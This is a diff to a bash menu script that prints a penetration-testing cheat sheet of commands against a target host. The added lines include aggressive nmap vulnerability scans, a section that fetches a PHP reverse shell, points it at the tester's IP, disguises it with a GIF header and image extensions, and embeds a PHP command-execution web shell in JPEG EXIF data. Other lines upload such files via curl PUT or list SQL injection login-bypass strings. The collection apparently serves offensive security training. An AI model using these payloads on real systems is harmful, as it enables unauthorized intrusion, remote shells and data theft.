@@ -58,17 +58,33 @@ function menu {
   echo -e "\033[32m(14) FTP Stuff\033[0m"
   echo -e "\033[32m(15) DNS/Dig stuff\033[0m"
   echo -e "\033[32m(16) Privelege Escalation Commons\033[0m"
-  echo -e "\033[32m(17) Helpful commands to remember\033[0m"
+  echo -e "\033[32m(17) File upload bypasses\033[0m"
+  echo -e "\033[32m(18) DNS Zone Transfers\033[0m"
+  echo -e "\033[32m(19) Common SQL Injections\033[0m"
+  echo -e "\033[32m(99) Helpful commands to remember\033[0m"
   echo "Enter your selection: "
   read selection
   clear
   case $selection in
     1)
       echo -e "\033[34mRustscan can be used for quick port scanning\033[0m"
-      command="rustscan -g -a 127.0.0.1 | cut -f 2 -d '[' | cut -f 1 -d ']'"
+      command="rustscan -g -a $T | cut -f 2 -d '[' | cut -f 1 -d ']'"
       echo "$command"
       echo -e "\033[34mThen we can pipe it into nmap with the ports we found for futher information where the ports are what we found from rustscan\033[0m"
       echo "nmap -sC -sV $T -p 80,443,9090"
+      echo -e "\033[34mGeneral Enumeration:\033[0m"
+      echo "nmap -vv -Pn -A -sC -sS -T 4 -p- $T"
+      echo -e "\033[34mVerbose, syn, all ports, all scripts, no ping\033[0m"
+      echo "nmap -v -sS -A -T4 $T"
+      echo ""
+      echo -e "\033[34mVerbose, SYN Stealth, Version info, and scripts against services.\033[0m"
+      echo "nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 $T"
+      echo ""
+      echo -e "\033[34mSMTP Enumeration\033[0m"
+      echo "nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $T"
+      echo ""
+      echo -e "\033[34mMySQL Enumeration\033[0m"
+      echo "nmap -sV -Pn -vv $T -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122"
       ;;
     2)
       echo -e "\033[34mWe can use wfuzz to try and find subdomains if we have found a domain name or vhost such as website.com\033[0m"
@@ -106,6 +122,8 @@ function menu {
       echo "smbclient -L //$T -U \"\""
       echo "smbmap -H $T"
       echo "showmount -e $T"
+      echo "#If showmount works"
+      echo "mount $T:/vol/share /mnt/nfs  -nolock"
       echo "smbget -R smb://$T/anonymous"
       echo "nmblookup -A $T"
       ;;
@@ -143,6 +161,7 @@ function menu {
     14)
       echo -e "\033[34mFTP Stuff\033[0m"
       echo "wget -m ftp://anonymous:anonymous@$T"
+      echo "nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $T"
       ;;
     15)
       echo -e "\033[34mDig for DNS stuff\033[0m"
@@ -174,6 +193,42 @@ function menu {
       echo "crontab -e"
       ;;
     17)
+      echo -e "\033[34mDownloading php reverse shell and creating a bunch of variants to try uploading\033[0m"
+      echo -e "\033[34mRemember to use burpsuite when trying to bypass file upload fields.\033[0m"
+      echo -e "\033[34mThis section will create a few variants to bypass upload filters\033[0m"
+      echo "mkdir phpreverseshell"
+      echo "wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -P phpreverseshell/"
+      echo "sed -i \"s/127.0.0.1/$myip/\" phpreverseshell/php-reverse-shell.php"
+      echo "echo 'GIF89a;' | cat - phpreverseshell/php-reverse-shell.php > temp && mv temp phpreverseshell/php-reverse-shell.php"
+      echo "cp phpreverseshell/php-reverse-shell.php phpreverseshell/php-reverse-shell.php.png"
+      echo "cp phpreverseshell/php-reverse-shell.php phpreverseshell/php-reverse-shell.php.jpg"
+      echo ""
+      echo -e "\033[34mNow we will create an exif variant/lfi variant. When uploaded use Tux.jpg?cmd=whoami\033[0m"
+      echo "wget https://upload.wikimedia.org/wikipedia/commons/5/56/Tux.jpg -P phpreverseshell/"
+      echo "exiftool -Comment='<?php echo \"<pre>\"; system(\$_GET['cmd']); ?>' phpreverseshell/Tux.jpg"
+      echo "mv phpreverseshell/Tux.jpg phpreverseshell/Tux.php.jpg"
+      echo ""
+      echo -e "\033[34mMake sure to replace (Content-type: application/x-php) with (Content-type: image/jpeg) using burpsuite)\033[0m"
+      echo ""
+      echo -e "\033[34mUploading file via CURL if the PUT option is available:\033[0m"
+      echo "curl --upload-file phpreverseshell/php-reverse-shell.php --url http://$T/test/shell.php --http1.0"
+      ;;
+    18)
+      echo -e "\033[34mDNS Zone Transfers\033[0m"
+      echo "dnsrecon -d $T -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml"
+      ;;
+    19)
+      echo -e "\033[34mCommon SQL Injections\033[0m"
+      echo "admin' --"
+      echo "admin' #"
+      echo "admin'/*"
+      echo "' or 1=1--"
+      echo "' or 1=1#"
+      echo "' or 1=1/*"
+      echo "') or '1'='1--"
+      echo "') or ('1'='1—"
+      ;;
+    99)
       echo -e "\033[34mEnumerating SNMP\033[0m"
       echo "snmpget -v 1 -c public $T"
       echo "snmpwalk -v 1 -c public $T"
@@ -196,6 +251,11 @@ function menu {
       echo ""
       echo -e "\033[34mCrack zip file password\033[0m"
       echo "sudo fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip"
+      echo ""
+      echo -e "\033[34mCompiling Exploits\033[0m"
+      echo "gcc -o exploit exploit.c"
+      echo -e "\033[34mCompile .exe on linux\033[0m"
+      echo "i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe"
       ;;
     1337)
       echo "You found the secret checklist menu!"
